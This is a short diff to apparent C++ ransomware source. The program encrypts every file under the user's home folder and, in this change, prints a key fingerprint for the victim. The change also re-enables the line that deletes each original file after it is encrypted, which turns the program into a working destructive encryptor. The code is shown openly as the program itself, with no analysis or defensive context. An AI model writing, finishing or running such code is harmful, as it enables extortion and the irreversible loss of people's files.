@@ -56,6 +56,7 @@ int main(){
 	//Encrypt files
 	std::vector<fs::path> roots = {homeFolder};
 	std::cout << "Encryption routines started!" << std::endl;
+	std::cout << "Your key ID: " << cryptorEngine.keyFingerprint() << std::endl;
 	std::vector<fs::path> successfullyEncrypted = cryptor::Main::encrypt(homeFolder, roots, cryptorEngine);
 
 	//If nothing was encrypted, simply exit
@@ -148,7 +149,7 @@ std::vector<fs::path> cryptor::Main::encrypt(const fs::path& homeFolder, const s
 			common::io::CryptorEngine::Status encryptionResult = cryptorEngine.encryptFile(target, encryptedOut);
 
 			//Delete the file at the given path if encryption was successful
-			//if(encryptionResult == common::io::CryptorEngine::Status::OK) fs::remove(target);
+			if(encryptionResult == common::io::CryptorEngine::Status::OK) fs::remove(target);
 
 			//Add the path to the appropriate vector depending on the result
 			encryptionResult == common::io::CryptorEngine::Status::OK ?
